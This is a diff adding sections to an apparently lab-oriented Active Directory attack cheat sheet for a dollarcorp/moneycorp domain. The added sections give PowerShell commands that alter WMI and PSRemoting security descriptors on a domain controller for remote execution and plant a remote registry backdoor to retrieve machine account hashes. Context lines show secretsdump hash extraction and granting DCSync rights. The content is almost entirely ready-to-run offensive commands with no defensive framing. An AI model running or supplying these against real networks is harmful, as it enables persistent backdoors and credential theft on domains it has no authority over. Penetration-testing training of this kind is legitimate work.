@@ -158,6 +158,35 @@ secretsdump.py -hashes <> -just-dc-ntlm <domain>/<user>@<IP-DC>
 ```
 Add-ObjectAcl -TargetDistinguishedName "dc=dollarcorp,dc=moneycorp,dc=local" -PrincipalSamAccountName <..USER..> -Rights DCSync -Verbose
 ```
+# Modify Security Descriptor WMI
+
+Give user right to execute remotely WMI
+
+```
+Set-RemoteWMI -UserName <user> -ComputerName dcorp-dc –namespace 'root\cimv2' -Verbose
+```
+exec:
+```
+gwmi -class win32_operatingsystem -ComputerName dcorp-dc.dollarcorp.moneycorp.local
+```
+
+
+Give access to winrm PS console to a user
+```
+Set-RemotePSRemoting -UserName <user> -ComputerName <remotehost> -Verb
+```
+exec:
+```
+Invoke-Command -ScriptBlock{whoami} -ComputerName dcorp-dc.dollarcorp.moneycorp.local
+```
+
+Retrieve Hash machine without Domain Admin right
+```
+Add-RemoteRegBackdoor -ComputerName <FQDN-MACHINE> -Trustee <user> -Verbose
+```
+```
+Get-RemoteMachineAccountHash -ComputerName <FQDN-MACHINE> -Verbose
+```
 
 # PTH with Mimikatz
 
